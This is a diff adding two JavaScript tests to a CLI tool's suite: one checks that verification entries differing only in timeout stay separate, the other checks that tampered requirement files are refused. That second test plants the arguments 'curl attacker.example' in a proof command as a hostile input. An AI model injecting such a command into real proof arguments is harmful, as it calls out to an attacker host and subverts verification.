@@ -1,5 +1,6 @@
 import assert from "node:assert/strict";
 import { execFileSync } from "node:child_process";
+import { existsSync } from "node:fs";
 import { mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
 import { tmpdir } from "node:os";
 import path from "node:path";
@@ -530,4 +531,68 @@ test("a CRLF checkout of an unchanged project still plans", async (t) => {
   requirement.statement = "Something nobody agreed to";
   await writeFile(requirementPath, `${JSON.stringify(requirement, undefined, 2)}\r\n`, "utf8");
   assert.equal((await run("validate", "--json")).exitCode, 1, "a real edit is still drift");
+});
+
+test("verification identity covers every field the runner acts on", async () => {
+  const { phaseVerification } = await import(
+    "../packages/cli/dist/workflow/taskgraph-input.js"
+  );
+
+  // This key has been wrong three times — exit code, argument boundaries, then
+  // timeout — each a field the runner acts on that the identity excluded, and
+  // each fix added one more field while leaving the next one out. Two entries
+  // are the same proof exactly when they are the same entry.
+  const enforcement = {
+    risk: { tier: "R2", reason: "x" },
+    budget: { maxFilesChanged: 1, maxLinesChanged: 1, maxNewFiles: 0 },
+    verification: { command: "pnpm", args: ["test"] }
+  };
+  const criterion = (overrides) => ({
+    id: "ac_same-1",
+    statement: "s",
+    proof: { mode: "executable", command: "pnpm", args: ["test"], expectedExitCode: 0, ...overrides }
+  });
+
+  // The project entry uses 600_000ms; a criterion differing only in timeout must
+  // not replace it, because the runner applies each entry's timeout
+  // independently and a one-second criterion would fail a ten-minute suite.
+  const differingTimeout = phaseVerification({
+    enforcement,
+    requirement: { requirement: {}, executable: [criterion({ timeoutMs: 1_000 })], manual: [] }
+  });
+  assert.equal(differingTimeout.length, 2, JSON.stringify(differingTimeout));
+
+  // Genuinely identical entries still collapse.
+  const identical = phaseVerification({
+    enforcement,
+    requirement: { requirement: {}, executable: [criterion({ timeoutMs: 600_000 })], manual: [] }
+  });
+  assert.equal(identical.length, 1, JSON.stringify(identical));
+});
+
+test("planning consumes the requirement snapshot it verified", async (t) => {
+  const { root, run } = await scratchProject(t);
+  const finalize = parseJsonOutput(
+    await run("start", "--finalize", "--json", "--created-at", CREATED_AT)
+  );
+
+  // A second independent read is a second snapshot. This asserts the outcome
+  // that depends on there being only one: an edited command is refused rather
+  // than reaching the contract between the check and the consumption.
+  const requirementPath = path.join(root, ...finalize.requirementSet.paths[0].split("/"));
+  const requirement = JSON.parse(await readFile(requirementPath, "utf8"));
+  requirement.acceptance.criteria[0].proof.args = ["--", "curl", "attacker.example"];
+  await writeFile(requirementPath, `${JSON.stringify(requirement, undefined, 2)}
+`, "utf8");
+
+  const planned = await run("plan", "1", "--json");
+  assert.equal(planned.exitCode, 1);
+  assert.equal(parseJsonOutput(planned).status, "requirement_set_drift");
+
+  // And nothing carrying that command was written.
+  const changes = path.join(root, ".legion/project/changes");
+  const written = existsSync(changes)
+    ? (await readFile(path.join(changes, "..", "requirements", "index.json"), "utf8"))
+    : "";
+  assert.doesNotMatch(written, /attacker\.example/);
 });
